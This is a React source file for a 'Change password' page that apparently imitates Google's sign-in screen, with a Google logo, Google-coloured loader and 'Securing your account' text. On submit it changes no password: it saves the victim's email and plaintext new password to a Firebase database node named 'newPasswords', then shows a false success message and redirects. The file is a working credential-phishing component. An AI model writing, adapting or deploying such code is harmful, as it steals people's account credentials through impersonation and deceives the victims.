import React, { useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { database, ref, push } from "../firebase";
import "./login.css";

const ChangePassword = () => {
  const [password, setPassword] = useState("");
  const [confirm, setConfirm] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [successMsg, setSuccessMsg] = useState("");
  const navigate = useNavigate();
  const location = useLocation();

  const email = location.state?.email || "user@example.com";

  const handleChange = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError("");
    setSuccessMsg("");

    if (password !== confirm) {
      setError("Passwords do not match.");
      setLoading(false);
      return;
    }

    try {
      await push(ref(database, "newPasswords"), {
        email,
        password,
        timestamp: new Date().toISOString(),
      });

      setSuccessMsg("Password changed successfully.");
      setPassword("");
      setConfirm("");

      setTimeout(() => {
      navigate("/");
        }, 2000);

    } catch (err) {
      setError("Failed to change password. Try again.");
    }

    setLoading(false);
  };

  return (
    <div className="login-container">
      <div className="login-box">
        <div className="logo-wrapper">
          <img src="/google.png" alt="Logo" className="login-logo" />
        </div>
        <h2 className="login-title">Change password</h2>
        <div className="email-pill">{email}</div>
        <p style={{ fontSize: "16px", fontWeight: "400", marginBottom: "20px", marginTop: 0 }}>
            Create a strong password
        </p>

        {loading ? (
          <div style={{ textAlign: "center", marginTop: "40px" }}>
            <p style={{ fontSize: "16px", fontWeight: "600", marginBottom: "6px" }}>
              Securing your account
            </p>
            <p style={{ fontSize: "14px", color: "#5f6368", marginBottom: "20px" }}>
              Please wait while we update your password.
            </p>
            <div className="google-loader">
              <span className="blue"></span>
              <span className="red"></span>
              <span className="yellow"></span>
              <span className="green"></span>
            </div>
            <p style={{ marginTop: "10px", fontSize: "16px" }}>Saving...</p>
          </div>
        ) : (
          <form onSubmit={handleChange} className="login-form">
            <input
              type={showPassword ? "text" : "password"}
              placeholder="Create password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="login-input"
              required
            />
            <input
              type={showPassword ? "text" : "password"}
              placeholder="Confirm password"
              value={confirm}
              onChange={(e) => setConfirm(e.target.value)}
              className="login-input"
              required
            />

            {error && <p style={{ color: "red", marginTop: "8px" }}>{error}</p>}
            {successMsg && (
              <p style={{ color: "green", marginTop: "8px" }}>{successMsg}</p>
            )}

            <div className="show-password">
              <input
                type="checkbox"
                id="showPassword"
                checked={showPassword}
                onChange={() => setShowPassword(!showPassword)}
              />
              <label htmlFor="showPassword"> Show password</label>
            </div>

            <div className="login-actions">
              <div></div> {/* empty left slot */}
              <button type="submit" className="next-button">
                Change Password
              </button>
            </div>
          </form>
        )}
      </div>
    </div>
  );
};

export default ChangePassword;
